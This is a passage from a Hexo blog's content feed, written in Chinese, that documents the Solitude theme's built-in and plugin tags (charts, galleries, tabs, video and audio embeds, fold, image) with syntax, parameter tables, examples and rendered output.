&gt;事务</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;<span class="strong">**行级锁**</span>(引用内部一样可以用格式)</span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">&gt; ....</span></span><br></pre></td></tr></table></figure><h2 id="渲染演示-Java-二级引用演示-MySQL-外键-事务-行级锁-引用内部一样可以用格式-…-1-5-分割线渲染演示"><a href="#渲染演示-Java-二级引用演示-MySQL-外键-事务-行级锁-引用内部一样可以用格式-…-1-5-分割线渲染演示" class="headerlink" title="渲染演示&gt;  Java&gt; 二级引用演示&gt; MySQL&gt; &gt;外键&gt; &gt;&gt; &gt;事务&gt; &gt;&gt; &gt;行级锁(引用内部一样可以用格式)&gt;&gt; ….## 1.5 分割线渲染演示"></a><code>渲染演示</code><br>&gt;  Java<br>&gt; 二级引用演示<br>&gt; MySQL<br>&gt; &gt;外键<br>&gt; &gt;<br>&gt; &gt;事务<br>&gt; &gt;<br>&gt; &gt;<strong>行级锁</strong>(引用内部一样可以用格式)<br>&gt;<br>&gt; ….<br>## 1.5 分割线<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="strong">**<span class="emphasis">*</span></span></span><br></pre></td></tr></table></figure><br><code>渲染演示</code></h2><hr>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 博客 </tag>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主题外挂标签使用</title>
      <link href="/posts/8f9926b7.html"/>
      <url>/posts/8f9926b7.html</url>
      
        <content type="html"><![CDATA[<div class="note danger modern no-icon"><p>内置的外挂标签满足大部分用户的需求，不需要额外安装插件。<br>插件的外挂标签需要安装对应的插件，满足部分用户的特殊需求。</p></div><h1 id="内置标签"><a href="#内置标签" class="headerlink" title="内置标签"></a>内置标签</h1><h2 id="Chart"><a href="#Chart" class="headerlink" title="Chart"></a>Chart</h2><p>图表标签，用于显示图表。<br>打开配置文件中开关</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">chart:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><div class="tabs" id="chart"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#chart-0">语法</button></li><li class="tab"><button type="button" data-href="#chart-1">参数</button></li><li class="tab"><button type="button" data-href="#chart-2">示例</button></li><li class="tab"><button type="button" data-href="#chart-3">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="chart-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% chart %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="chart-1"><p>不需要参数。</p></div><div class="tab-item-content" id="chart-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% chart %&#125;</span><br><span class="line">&#123;% endchart %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="chart-3"><div class="chart">    <canvas id="chart-ta1fdql6z"></canvas>    <script>    !function() {      const chart = () => {        const canvas = document.getElementById("chart-ta1fdql6z");        if (!canvas) return;        const ctx = canvas.getContext("2d");        new Chart(ctx, {type: 'bar',data: {    labels: ['Red', 'Blue', 'Yellow', 'Green', 'Purple', 'Orange'],    datasets: [{      label: '# of Votes',      data: [12, 19, 3, 5, 2, 3],      borderWidth: 1    }]},options: {    scales: {        y: {            beginAtZero: true,        }    }}});      };      document.addEventListener("DOMContentLoaded", chart);      utils.addEventListenerPjax(document, "pjax:complete", chart);    }()    </script>  </div></div></div></div><h2 id="Gallery"><a href="#Gallery" class="headerlink" title="Gallery"></a>Gallery</h2><p>图片列表标签，用于显示图片列表。</p><div class="tabs" id="gallery"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#gallery-0">语法</button></li><li class="tab"><button type="button" data-href="#gallery-1">示例</button></li><li class="tab"><button type="button" data-href="#gallery-2">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="gallery-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="gallery-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![<span class="string">image</span>](<span class="link">https://ui.everfu.cn/c5ba10122f00a2b320661872d392fe98.webp/cover</span>)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="gallery-2"><div class="gallery-container waterfall">        <div class="gallery-item"><img class="nolazyload" src=https://ui.everfu.cn/c5ba10122f00a2b320661872d392fe98.webp/cover alt="image" /></div><div class="gallery-item"><img class="nolazyload" src=https://ui.everfu.cn/6569e625863863d8da51bf33ef9969d4.png/cover alt="i" /></div><div class="gallery-item"><img class="nolazyload" src=https://ui.everfu.cn/dc0b30a14e9c0af1f4702029a4ac7af4.png/cover alt="1" /></div><div class="gallery-item"><img class="nolazyload" src=https://ui.everfu.cn/7acf4eff2c1d16dbfba9567c9bbc943d.png/cover alt="2" /></div><div class="gallery-item"><img class="nolazyload" src=https://ui.everfu.cn/b378a1834320883d710ec3cb7b3569b5.png/cover alt="3" /></div>      </div></div></div></div><h2 id="GalleryGroup"><a href="#GalleryGroup" class="headerlink" title="GalleryGroup"></a>GalleryGroup</h2><p>图片组标签，用于显示图片组。</p><div class="tabs" id="gallerygroup"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#gallerygroup-0">语法</button></li><li class="tab"><button type="button" data-href="#gallerygroup-1">参数</button></li><li class="tab"><button type="button" data-href="#gallerygroup-2">示例</button></li><li class="tab"><button type="button" data-href="#gallerygroup-3">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="gallerygroup-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% galleryGroup &#x27;name&#x27; &#x27;desc&#x27; &#x27;url&#x27; &#x27;img&#x27; %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="gallerygroup-1"><table><thead><tr><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td>name</td><td>图片组名称</td><td>无</td></tr><tr><td>desc</td><td>图片组描述</td><td>无</td></tr><tr><td>url</td><td>图片组链接</td><td>无</td></tr><tr><td>img</td><td>图片组预览图</td><td>无</td></tr></tbody></table></div><div class="tab-item-content" id="gallerygroup-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;gallery-group-main&#x27;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup &#x27;旅行&#x27; &#x27;出行拍摄的杂七杂八&#x27; &#x27;https://solitude.js.org&#x27; &#x27;https://ui.everfu.cn/1dc1f7593d718c12d06ed210d9f28f0c.webp/cover&#x27; %&#125;</span><br><span class="line">&#123;% galleryGroup &#x27;旅行&#x27; &#x27;出行拍摄的杂七杂八&#x27; &#x27;https://solitude.js.org&#x27; &#x27;https://ui.everfu.cn/1dc1f7593d718c12d06ed210d9f28f0c.webp/cover&#x27; %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="gallerygroup-3"><div class='gallery-group-main'><figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src= "" data-lazy-src='https://ui.everfu.cn/1dc1f7593d718c12d06ed210d9f28f0c.webp/cover' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">旅行</div>  <p>出行拍摄的杂七杂八</p>  <a href='https://solitude.js.org'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src= "" data-lazy-src='https://ui.everfu.cn/1dc1f7593d718c12d06ed210d9f28f0c.webp/cover' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">旅行</div>  <p>出行拍摄的杂七杂八</p>  <a href='https://solitude.js.org'></a>  </figcaption>  </figure>  </div></div></div></div><h2 id="Mermaid"><a href="#Mermaid" class="headerlink" title="Mermaid"></a>Mermaid</h2><p>Mermaid 标签，用于显示 Mermaid 图表。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mermaid:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><div class="tabs" id="mermaid"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#mermaid-0">语法</button></li><li class="tab"><button type="button" data-href="#mermaid-1">示例</button></li><li class="tab"><button type="button" data-href="#mermaid-2">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="mermaid-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% mermaid %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endmermaid %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="mermaid-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% mermaid %&#125;</span><br><span class="line">pie</span><br><span class="line">title Key elements in Product X</span><br><span class="line">&quot;Calcium&quot; : 42.96</span><br><span class="line">&quot;Potassium&quot; : 50.05</span><br><span class="line">&quot;Magnesium&quot; : 10.01</span><br><span class="line">&quot;Iron&quot; : 5</span><br><span class="line">&#123;% endmermaid %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="mermaid-2"><p><img src= "" data-lazy-src="https://ui.everfu.cn/fe76bd087af1202f0076b71d7d860676.png/cover" alt="效果"></p></div></div></div><h2 id="Typeit"><a href="#Typeit" class="headerlink" title="Typeit"></a>Typeit</h2><p>Typeit 标签，用于显示 Typeit 动画。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">typeit:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><div class="tabs" id="typeit"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#typeit-0">语法</button></li><li class="tab"><button type="button" data-href="#typeit-1">参数</button></li><li class="tab"><button type="button" data-href="#typeit-2">示例</button></li><li class="tab"><button type="button" data-href="#typeit-3">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="typeit-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% typeit &#x27;div&#x27; %&#125;</span><br><span class="line">options</span><br><span class="line">&#123;% endtypeit %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="typeit-1"><table><thead><tr><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td>div</td><td>标签名</td><td>无</td></tr></tbody></table></div><div class="tab-item-content" id="typeit-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% typeit &#x27;div&#x27; &#125;</span><br><span class="line">waitUntilVisible: true,</span><br><span class="line">strings: &quot;Alex MacArthur&quot;,</span><br><span class="line">&#123;% endtypeit %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="typeit-3"><div class="typeit">    <div id="typeit-dbowivtnj"></div>    <script>    !function() {      const typeit = () => {        const ctx = document.getElementById("typeit-dbowivtnj");        if (!ctx) return;        new TypeIt("#typeit-dbowivtnj", {waitUntilVisible: true,strings: "Alex MacArthur"})          .go();      }      document.addEventListener("DOMContentLoaded", typeit);      utils.addEventListenerPjax(document, "pjax:complete", typeit);    }()    </script>  </div></div></div></div><h2 id="Tabs"><a href="#Tabs" class="headerlink" title="Tabs"></a>Tabs</h2><p>标签页标签，用于显示标签页。</p><div class="tabs" id="tabs"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#tabs-0">语法</button></li><li class="tab"><button type="button" data-href="#tabs-1">示例</button></li><li class="tab"><button type="button" data-href="#tabs-2">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="tabs-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs 唯一名称, [index] %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab [唯一Tab] [@icon] --&gt;</span><br><span class="line"></span><br><span class="line">任何内容（也支持内联标签）。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="tabs-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"></span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"></span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"></span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="tabs-2"><div class="note primary flat"><i class="solitude fas fa-wand-magic-sparkles"></i><p>基础</p></div><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-0">test1 0</button></li><li class="tab"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-0"><p><strong>This is Tab 1.</strong></p></div><div class="tab-item-content" id="test1-1"><p><strong>This is Tab 2.</strong></p></div><div class="tab-item-content" id="test1-2"><p><strong>This is Tab 3.</strong></p></div></div></div><div class="note primary flat"><i class="solitude fas fa-wand-magic-sparkles"></i><p>预选择tab</p></div><div class="tabs" id="test2"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test2-0">test2 0</button></li><li class="tab"><button type="button" data-href="#test2-1">test2 1</button></li><li class="tab active"><button type="button" data-href="#test2-2">test2 2</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test2-0"><p><strong>This is Tab 1.</strong></p></div><div class="tab-item-content" id="test2-1"><p><strong>This is Tab 2.</strong></p></div><div class="tab-item-content active" id="test2-2"><p><strong>This is Tab 3.</strong></p></div></div></div></div></div></div><h1 id="插件标签"><a href="#插件标签" class="headerlink" title="插件标签"></a>插件标签</h1><p>安装插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-solitude-tag</span><br></pre></td></tr></table></figure><h2 id="Youtube"><a href="#Youtube" class="headerlink" title="Youtube"></a>Youtube</h2><p>Youtube 标签，用于显示 Youtube 视频。</p><div class="tabs" id="youtube"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#youtube-0">语法</button></li><li class="tab"><button type="button" data-href="#youtube-1">参数</button></li><li class="tab"><button type="button" data-href="#youtube-2">示例</button></li><li class="tab"><button type="button" data-href="#youtube-3">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="youtube-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% youtube video<span class="emphasis">_id [type] [cookie] %&#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="youtube-1"><table><thead><tr><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td>video_id</td><td>视频 ID</td><td>无</td></tr><tr><td>type</td><td>视频类型</td><td>video</td></tr><tr><td>cookie</td><td>是否使用 cookie</td><td>false</td></tr></tbody></table></div><div class="tab-item-content" id="youtube-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% youtube &#x27;dQw4w9WgXcQ&#x27; %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="youtube-3"><div class="video-container"><iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" frameborder="0" loading="lazy" allowfullscreen></iframe></div></div></div></div><h2 id="Bilibili"><a href="#Bilibili" class="headerlink" title="Bilibili"></a>Bilibili</h2><p>Bilibili 标签，用于显示 Bilibili 视频。</p><div class="tabs" id="bilibili"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#bilibili-0">语法</button></li><li class="tab"><button type="button" data-href="#bilibili-1">参数</button></li><li class="tab"><button type="button" data-href="#bilibili-2">示例</button></li><li class="tab"><button type="button" data-href="#bilibili-3">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="bilibili-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bvideo video<span class="emphasis">_id %&#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="bilibili-1"><table><thead><tr><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td>video_id</td><td>视频 ID</td><td>无</td></tr></tbody></table></div><div class="tab-item-content" id="bilibili-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bvideo &#x27;BV1B9W6eaEX1&#x27; %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="bilibili-3"><div class="video-container"><iframe src="//player.bilibili.com/player.html?autoplay=0&bvid=BV1B9W6eaEX1" frameborder="0" loading="lazy" allowfullscreen></iframe></div></div></div></div><h2 id="Audio"><a href="#Audio" class="headerlink" title="Audio"></a>Audio</h2><p>Audio 标签，用于显示音频。</p><div class="tabs" id="audio"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#audio-0">语法</button></li><li class="tab"><button type="button" data-href="#audio-1">参数</button></li><li class="tab"><button type="button" data-href="#audio-2">示例</button></li><li class="tab"><button type="button" data-href="#audio-3">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="audio-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio url %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="audio-1"><table><thead><tr><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td>url</td><td>音频链接</td><td>无</td></tr></tbody></table></div><div class="tab-item-content" id="audio-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio &#x27;https://music.163.com/song/media/outer/url?id=1436709407.mp3&#x27; %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="audio-3"><div class="audio"><audio controls preload><source src="https://music.163.com/song/media/outer/url?id=1436709407.mp3" type="audio&#x2F;mp3">Your browser does not support the audio tag.</source></div></div></div></div><h2 id="Video"><a href="#Video" class="headerlink" title="Video"></a>Video</h2><p>Video 标签，用于显示视频。</p><div class="tabs" id="video"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#video-0">语法</button></li><li class="tab"><button type="button" data-href="#video-1">参数</button></li><li class="tab"><button type="button" data-href="#video-2">示例</button></li><li class="tab"><button type="button" data-href="#video-3">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="video-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video url %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="video-1"><table><thead><tr><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td>url</td><td>视频链接</td><td>无</td></tr></tbody></table></div><div class="tab-item-content" id="video-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video &#x27;https://media.w3.org/2010/05/sintel/trailer.mp4&#x27; %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="video-3"><div class="video"><video controls preload><source src="https://media.w3.org/2010/05/sintel/trailer.mp4" type="video&#x2F;mp4">Your browser does not support the video tag.</source></div></div></div></div><h2 id="Videos"><a href="#Videos" class="headerlink" title="Videos"></a>Videos</h2><p>Videos 标签，用于显示视频列表。</p><div class="tabs" id="videos"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#videos-0">语法</button></li><li class="tab"><button type="button" data-href="#videos-1">参数</button></li><li class="tab"><button type="button" data-href="#videos-2">示例</button></li><li class="tab"><button type="button" data-href="#videos-3">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="videos-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos [col] %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="videos-1"><table><thead><tr><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td>col</td><td>列数</td><td>1</td></tr></tbody></table></div><div class="tab-item-content" id="videos-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos 2 %&#125;</span><br><span class="line">&#123;% video &#x27;https://media.w3.org/2010/05/sintel/trailer.mp4&#x27; %&#125;</span><br><span class="line">&#123;% video &#x27;https://media.w3.org/2010/05/bunny/trailer.mp4&#x27; %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="videos-3"><div class="videos" col="2"><div class="video"><video controls preload><source src="https://media.w3.org/2010/05/sintel/trailer.mp4" type="video&#x2F;mp4">Your browser does not support the video tag.</source></div><div class="video"><video controls preload><source src="https://media.w3.org/2010/05/bunny/trailer.mp4" type="video&#x2F;mp4">Your browser does not support the video tag.</source></div></div></div></div></div><h2 id="P"><a href="#P" class="headerlink" title="P"></a>P</h2><p>没错，就是 P 标签。</p><div class="tabs" id="p"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#p-0">语法</button></li><li class="tab"><button type="button" data-href="#p-1">参数</button></li><li class="tab"><button type="button" data-href="#p-2">示例</button></li><li class="tab"><button type="button" data-href="#p-3">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="p-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% p [cls] [content] %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="p-1"><table><thead><tr><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td>cls</td><td>类名</td><td>无</td></tr><tr><td>content</td><td>内容</td><td>无</td></tr></tbody></table><p>cls: center, left, right, h1, h2, h3, h4, h5, h6, red, green, blue, yellow, purple, orange, gray</p></div><div class="tab-item-content" id="p-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% p &#x27;center h2&#x27; &#x27;Hello World!&#x27; %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="p-3"><p class="center h2">Hello World!</p></div></div></div><h2 id="Span"><a href="#Span" class="headerlink" title="Span"></a>Span</h2><p>没错，就是 Span 标签。</p><div class="tabs" id="span"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#span-0">语法</button></li><li class="tab"><button type="button" data-href="#span-1">参数</button></li><li class="tab"><button type="button" data-href="#span-2">示例</button></li><li class="tab"><button type="button" data-href="#span-3">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="span-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% span [cls] [content] %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="span-1"><table><thead><tr><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td>cls</td><td>类名</td><td>无</td></tr><tr><td>content</td><td>内容</td><td>无</td></tr></tbody></table></div><div class="tab-item-content" id="span-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% span &#x27;red h2&#x27; &#x27;Hello World!&#x27; %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="span-3"><p><span class="red h2">Hello World!</span></p></div></div></div><h2 id="Fold"><a href="#Fold" class="headerlink" title="Fold"></a>Fold</h2><p>折叠标签，用于显示折叠内容。</p><div class="tabs" id="fold"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#fold-0">语法</button></li><li class="tab"><button type="button" data-href="#fold-1">参数</button></li><li class="tab"><button type="button" data-href="#fold-2">示例</button></li><li class="tab"><button type="button" data-href="#fold-3">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="fold-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% fold &#x27;title&#x27; open %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endfold %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="fold-1"><table><thead><tr><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td>title</td><td>标题</td><td>无</td></tr><tr><td>open</td><td>是否展开</td><td>不填不显示</td></tr></tbody></table></div><div class="tab-item-content" id="fold-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% fold &#x27;title&#x27; open %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endfold %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="fold-3"><details open><summary>title</summary><p>content</p></details></div></div></div><h2 id="Img"><a href="#Img" class="headerlink" title="Img"></a>Img</h2><p>图片标签，用于显示图片。</p><div class="tabs" id="img"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#img-0">语法</button></li><li class="tab"><button type="button" data-href="#img-1">参数</button></li><li class="tab"><button type="button" data-href="#img-2">示例</button></li><li class="tab"><button type="button" data-href="#img-3">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="img-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% img url [alt] [style] %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="img-1"><table><thead><tr><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td>url</td><td>图片链接</td><td>无</td></tr><tr><td>alt</td><td>图片描述</td><td>无</td></tr><tr><td>style</td><td>图片样式</td><td>无</td></tr></tbody></table></div><div class="tab-item-content" id="img-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% img &#x27;https://ui.everfu.cn/5e27069a26f95747442594647fc7d8b9.png/cover&#x27; &#x27;cover&#x27; &#x27;width: 200px&#x27; %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="img-3"><img src= "" data-lazy-src="https://ui.everfu.cn/5e27069a26f95747442594647fc7d8b9.png/cover" alt="cover" style="width: 200px"></div></div></div><h2 id="Inline-Img"><a href="#Inline-Img" class="headerlink" title="Inline Img"></a>Inline Img</h2><p>内联图片标签，用于显示内联图片。</p><div class="tabs" id="inlineimg"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#inlineimg-0">语法</button></li><li class="tab"><button type="button" data-href="#inlineimg-1">参数</button></li><li class="tab"><button type="button" 